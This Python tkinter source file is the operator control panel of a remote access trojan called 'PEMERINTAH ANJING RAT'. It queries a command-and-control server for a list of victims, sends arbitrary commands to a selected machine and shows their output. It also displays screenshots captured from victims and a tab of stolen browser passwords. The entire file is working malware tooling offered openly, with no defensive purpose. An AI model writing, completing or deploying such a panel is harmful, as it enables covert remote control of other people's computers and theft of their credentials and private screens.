import tkinter as tk
from tkinter import ttk, messagebox
import requests
import threading
import base64
import io
from PIL import Image, ImageTk
import json
import time

class RATDesktopApp:
    def __init__(self, root):
        self.root = root
        self.root.title("PEMERINTAH ANJING RAT v1.0")
        self.root.geometry("1300x750")
        self.root.configure(bg='#0a0a0a')
        self.root.minsize(1000, 600)
        
        self.server = "http://localhost:5000"
        self.current_victim = None
        self.victims = []
        
        self.setup_ui()
        self.load_victims()
        self.start_auto_refresh()
    
    def setup_ui(self):
        # Header
        header = tk.Frame(self.root, bg='#0a0a0a', height=60)
        header.pack(fill='x', padx=15, pady=(10,5))
        header.pack_propagate(False)
        
        title = tk.Label(header, text="PEMERINTAH ANJING RAT", 
                        font=('Courier New', 18, 'bold'), 
                        fg='#c41e3a', bg='#0a0a0a')
        title.pack(side='left')
        
        self.status_label = tk.Label(header, text="● ONLINE", 
                                    font=('Courier New', 10), 
                                    fg='#00ff00', bg='#0a0a0a')
        self.status_label.pack(side='right')
        
        # Main container
        main = tk.Frame(self.root, bg='#0a0a0a')
        main.pack(fill='both', expand=True, padx=15, pady=5)
        
        # LEFT PANEL - Victims
        left_panel = tk.Frame(main, bg='#0f0f0f', width=280)
        left_panel.pack(side='left', fill='y', padx=(0,10))
        left_panel.pack_propagate(False)
        
        victim_title = tk.Label(left_panel, text="🎯 TARGET LIST", 
                               bg='#0f0f0f', fg='#666', 
                               font=('Courier New', 10, 'bold'))
        victim_title.pack(pady=(15,10))
        
        # Listbox with scrollbar
        list_frame = tk.Frame(left_panel, bg='#0f0f0f')
        list_frame.pack(fill='both', expand=True, padx=10, pady=(0,10))
        
        scrollbar = tk.Scrollbar(list_frame, bg='#0f0f0f')
        scrollbar.pack(side='right', fill='y')
        
        self.victim_listbox = tk.Listbox(list_frame, 
                                         bg='#1a1a1a', 
                                         fg='#00ff00',
                                         font=('Courier New', 10),
                                         selectbackground='#c41e3a',
                                         selectforeground='white',
                                         yscrollcommand=scrollbar.set,
                                         borderwidth=0,
                                         highlightthickness=0)
        self.victim_listbox.pack(side='left', fill='both', expand=True)
        scrollbar.config(command=self.victim_listbox.yview)
        self.victim_listbox.bind('<<ListboxSelect>>', self.on_victim_select)
        
        # RIGHT PANEL
        right_panel = tk.Frame(main, bg='#0a0a0a')
        right_panel.pack(side='left', fill='both', expand=True)
        
        # Command bar
        cmd_frame = tk.Frame(right_panel, bg='#0f0f0f', height=60)
        cmd_frame.pack(fill='x', pady=(0,10))
        cmd_frame.pack_propagate(False)
        
        cmd_label = tk.Label(cmd_frame, text=">_", 
                            bg='#0f0f0f', fg='#c41e3a', 
                            font=('Courier New', 12, 'bold'))
        cmd_label.pack(side='left', padx=(15,5))
        
        self.cmd_entry = tk.Entry(cmd_frame, 
                                  bg='#0a0a0a', 
                                  fg='#00ff00',
                                  font=('Courier New', 11),
                                  insertbackground='#00ff00',
                                  relief='flat',
                                  borderwidth=0)
        self.cmd_entry.pack(side='left', fill='x', expand=True, padx=(0,10))
        self.cmd_entry.bind('<Return>', lambda e: self.send_command())
        
        exec_btn = tk.Button(cmd_frame, text="EXECUTE", 
                            command=self.send_command,
                            bg='#c41e3a', fg='white', 
                            font=('Courier New', 10, 'bold'),
                            relief='flat', cursor='hand2',
                            padx=20, pady=8)
        exec_btn.pack(side='right', padx=15)
        
        # Tab control
        tab_frame = tk.Frame(right_panel, bg='#0a0a0a')
        tab_frame.pack(fill='x')
        
        self.tab_btns = {}
        tabs = [('OUTPUT', 0), ('SCREENSHOTS', 1), ('PASSWORDS', 2)]
        
        for text, idx in tabs:
            btn = tk.Button(tab_frame, text=text, 
                           command=lambda i=idx: self.switch_tab(i),
                           bg='#0f0f0f', fg='#888',
                           font=('Courier New', 10, 'bold'),
                           relief='flat', padx=20, pady=8)
            btn.pack(side='left', padx=(0,2))
            self.tab_btns[idx] = btn
        
        self.current_tab = 0
        self.tab_btns[0].configure(bg='#c41e3a', fg='white')
        
        # Content area
        self.content_frame = tk.Frame(right_panel, bg='#0a0a0a')
        self.content_frame.pack(fill='both', expand=True, pady=(10,0))
        
        # OUTPUT TAB
        self.output_frame = tk.Frame(self.content_frame, bg='#0a0a0a')
        self.output_text = tk.Text(self.output_frame, 
                                   bg='#050505', fg='#00ff00',
                                   font=('Courier New', 10), 
                                   wrap='word',
                                   relief='flat', borderwidth=0,
                                   padx=15, pady=15)
        self.output_text.pack(side='left', fill='both', expand=True)
        
        output_scroll = tk.Scrollbar(self.output_text)
        output_scroll.pack(side='right', fill='y')
        self.output_text.config(yscrollcommand=output_scroll.set)
        output_scroll.config(command=self.output_text.yview)
        
        # SCREENSHOTS TAB
        self.shots_frame = tk.Frame(self.content_frame, bg='#0a0a0a')
        self.shots_canvas = tk.Canvas(self.shots_frame, bg='#0a0a0a', highlightthickness=0)
        shots_scroll = tk.Scrollbar(self.shots_frame, orient='vertical', command=self.shots_canvas.yview)
        self.shots_inner = tk.Frame(self.shots_canvas, bg='#0a0a0a')
        
        self.shots_canvas.configure(yscrollcommand=shots_scroll.set)
        self.shots_canvas.create_window((0,0), window=self.shots_inner, anchor='nw')
        
        self.shots_canvas.pack(side='left', fill='both', expand=True)
        shots_scroll.pack(side='right', fill='y')
        
        self.shots_inner.bind('<Configure>', lambda e: self.shots_canvas.configure(scrollregion=self.shots_canvas.bbox('all')))
        
        # PASSWORDS TAB
        self.pwd_frame = tk.Frame(self.content_frame, bg='#0a0a0a')
        self.pwd_text = tk.Text(self.pwd_frame, 
                                bg='#050505', fg='#ff00ff',
                                font=('Courier New', 10), 
                                wrap='word',
                                relief='flat', borderwidth=0,
                                padx=15, pady=15)
        self.pwd_text.pack(side='left', fill='both', expand=True)
        
        pwd_scroll = tk.Scrollbar(self.pwd_text)
        pwd_scroll.pack(side='right', fill='y')
        self.pwd_text.config(yscrollcommand=pwd_scroll.set)
        pwd_scroll.config(command=self.pwd_text.yview)
        
        # Show initial tab
        self.output_frame.pack(fill='both', expand=True)
        
        # Footer
        footer = tk.Frame(self.root, bg='#050505', height=30)
        footer.pack(fill='x', side='bottom')
        footer.pack_propagate(False)
        
        footer_label = tk.Label(footer, text="PEMERINTAH ANJING RAT | by ahmouy", 
                               bg='#050505', fg='#444',
                               font=('Courier New', 9))
        footer_label.pack()
    
    def switch_tab(self, tab):
        self.current_tab = tab
        
        for i, btn in self.tab_btns.items():
            btn.configure(bg='#0f0f0f', fg='#888')
        
        self.tab_btns[tab].configure(bg='#c41e3a', fg='white')
        
        # Hide all frames
        self.output_frame.pack_forget()
        self.shots_frame.pack_forget()
        self.pwd_frame.pack_forget()
        
        if tab == 0:
            self.output_frame.pack(fill='both', expand=True)
            self.load_results()
        elif tab == 1:
            self.shots_frame.pack(fill='both', expand=True)
            self.load_screenshots()
        elif tab == 2:
            self.pwd_frame.pack(fill='both', expand=True)
            self.load_passwords()
    
    def on_victim_select(self, event):
        selection = self.victim_listbox.curselection()
        if selection:
            self.current_victim = self.victims[selection[0]]['victim_id']
            self.load_results()
            self.load_screenshots()
            self.load_passwords()
    
    def load_victims(self):
        try:
            r = requests.get(f"{self.server}/api/victims", timeout=5)
            self.victims = r.json()
            self.victim_listbox.delete(0, tk.END)
            for v in self.victims:
                self.victim_listbox.insert(tk.END, f"  {v['hostname']}  |  {v['ip']}")
            
            if self.victims and not self.current_victim:
                self.current_victim = self.victims[0]['victim_id']
                self.victim_listbox.selection_set(0)
                self.load_results()
        except Exception as e:
            self.status_label.config(text="● OFFLINE", fg='#c41e3a')
    
    def load_results(self):
        if not self.current_victim:
            return
        
        try:
            r = requests.get(f"{self.server}/api/commands/{self.current_victim}", timeout=5)
            commands = r.json()
            
            self.output_text.delete(1.0, tk.END)
            self.output_text.insert(tk.END, f"\n{'='*70}\n")
            self.output_text.insert(tk.END, f"  COMMAND HISTORY - {self.current_victim}\n")
            self.output_text.insert(tk.END, f"{'='*70}\n\n")
            
            for cmd in commands[:30]:
                self.output_text.insert(tk.END, f"┌─[ {cmd['command']} ]\n")
                self.output_text.insert(tk.END, f"│  {cmd['timestamp']}\n")
                self.output_text.insert(tk.END, f"└─► {cmd['result'][:500]}\n")
                self.output_text.insert(tk.END, f"\n{'-'*70}\n\n")
            
            self.output_text.see(tk.END)
            self.status_label.config(text="● ONLINE", fg='#00ff00')
        except Exception as e:
            pass
    
    def load_screenshots(self):
        if not self.current_victim:
            return
        
        try:
            r = requests.get(f"{self.server}/api/screenshots/{self.current_victim}", timeout=5)
            shots = r.json()
            
            for widget in self.shots_inner.winfo_children():
                widget.destroy()
            
            for shot in shots[:10]:
                img_data = base64.b64decode(shot['image'])
                img = Image.open(io.BytesIO(img_data))
                
                # Resize image
                img.thumbnail((350, 250), Image.Resampling.LANCZOS)
                photo = ImageTk.PhotoImage(img)
                
                frame = tk.Frame(self.shots_inner, bg='#0f0f0f', relief='flat', bd=1)
                frame.pack(pady=10, padx=10, fill='x')
                
                lbl_img = tk.Label(frame, image=photo, bg='#0f0f0f')
                lbl_img.image = photo
                lbl_img.pack(pady=10)
                
                lbl_time = tk.Label(frame, text=shot['timestamp'], 
                                   bg='#0f0f0f', fg='#666', 
                                   font=('Courier New', 9))
                lbl_time.pack(pady=(0,10))
            
            self.shots_inner.update_idletasks()
            self.shots_canvas.configure(scrollregion=self.shots_canvas.bbox('all'))
        except Exception as e:
            pass
    
    def load_passwords(self):
        if not self.current_victim:
            return
        
        try:
            r = requests.get(f"{self.server}/api/passwords/{self.current_victim}", timeout=5)
            passwords = r.json()
            
            self.pwd_text.delete(1.0, tk.END)
            self.pwd_text.insert(tk.END, f"\n{'='*70}\n")
            self.pwd_text.insert(tk.END, f"  STOLEN PASSWORDS\n")
            self.pwd_text.insert(tk.END, f"{'='*70}\n\n")
            
            for pwd in passwords:
                self.pwd_text.insert(tk.END, f"┌─[ {pwd['browser']} ]\n")
                self.pwd_text.insert(tk.END, f"│  URL: {pwd['url']}\n")
                self.pwd_text.insert(tk.END, f"│  Username: {pwd['username']}\n")
                self.pwd_text.insert(tk.END, f"│  Password: {pwd['password']}\n")
                self.pwd_text.insert(tk.END, f"│  Time: {pwd['timestamp']}\n")
                self.pwd_text.insert(tk.END, f"└─►\n")
                self.pwd_text.insert(tk.END, f"\n{'-'*70}\n\n")
            
            self.pwd_text.see(tk.END)
        except Exception as e:
            pass
    
    def send_command(self):
        cmd = self.cmd_entry.get().strip()
        if not self.current_victim:
            messagebox.showwarning("Warning", "Select a target first!")
            return
        if not cmd:
            messagebox.showwarning("Warning", "Enter a command!")
            return
        
        self.cmd_entry.delete(0, tk.END)
        self.output_text.insert(tk.END, f"\n{'='*70}\n")
        self.output_text.insert(tk.END, f"[SENT] {cmd}\n")
        self.output_text.insert(tk.END, f"{'='*70}\n")
        self.output_text.see(tk.END)
        
        try:
            requests.post(f"{self.server}/api/send_command", json={
                'victim_id': self.current_victim,
                'command': cmd,
                'source': 'web'
            }, timeout=5)
            
            self.root.after(2000, self.load_results)
            self.root.after(3000, self.load_screenshots)
        except Exception as e:
            self.output_text.insert(tk.END, f"[ERROR] Failed to send: {e}\n")
    
    def start_auto_refresh(self):
        def refresh():
            self.load_victims()
            if self.current_tab == 0:
                self.load_results()
            elif self.current_tab == 1:
                self.load_screenshots()
            elif self.current_tab == 2:
                self.load_passwords()
            self.root.after(5000, refresh)
        
        self.root.after(3000, refresh)

if __name__ == "__main__":
    root = tk.Tk()
    app = RATDesktopApp(root)
    root.mainloop()
